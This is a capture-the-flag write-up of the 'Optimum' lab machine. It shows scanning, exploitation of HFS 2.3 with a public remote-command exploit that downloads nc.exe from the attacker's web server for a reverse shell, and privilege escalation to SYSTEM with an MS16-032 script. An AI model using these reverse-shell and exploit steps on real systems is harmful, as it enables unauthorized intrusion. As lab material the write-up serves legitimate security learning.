# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.8 optimum.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.

```bash 
$ which resolve 
resolve () {
        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
}

$ which superscan
superscan () {
        name="$(resolve $1)" 
        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
}

$ superscan optimum.htb                                                                  1 тип
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.

# Enumeration (1)

## Port 80 `HttpFileServer httpd 2.3`

![](/assets/images/optimum1.png)

Even though there is a login, we didn't have credentials so lets search if there are any exploits for this service.

```bash
$ searchsploit hfs 2.3
----------------------------------------------------------------------- ---------------------------------

...
```

# Exploitation (1)

The ```Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)``` seems promising. After copying it, we will need to setup a web server that hosts a `nc.exe`.

```bash
$ mkdir web
$ cd web
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ sudo updog -p 80
[sudo] password for kali: 
[+] Serving /home/kali/Desktop/web...
 * Running on http://0.0.0.0:80/ (Press CTRL+C to 
```

Then, we start our `nc` listener.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

And finally we modify the `ip_addr` and `local_port` variable in the script and run it.
```bash
$ cat 39161.py
...
        ip_addr = "10.10.XX.XX" #local IP address
        local_port = "1337" # Local Port number

$ python 39161.py optimum.htb 80
```

We will see some requests for `nc.exe` on our web server as well as see that we got a shell as `kostas`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.8] 49158

# Enumeration (2)

We run [`Sherlock.ps1`](https://github.com/rasta-mouse/Sherlock) and see that the machine might be vulnerable to some kernel exploits.

# Exploitation (2)

I decided to target `MS16-032` and found a [script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that can exploit this for us.

We first have to start a `nc` listener.

```bash
$ nc -vlnp 1337 
listening on [any] 1337 ...
```

And then run the exploit script that will start a reverse shell connection to us.

```

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

On our listener, we get a connection as `SYSTEM`!

```bash
$ sudo rlwrap nc -lvnp 1337     
listening on [any] 1337 ...
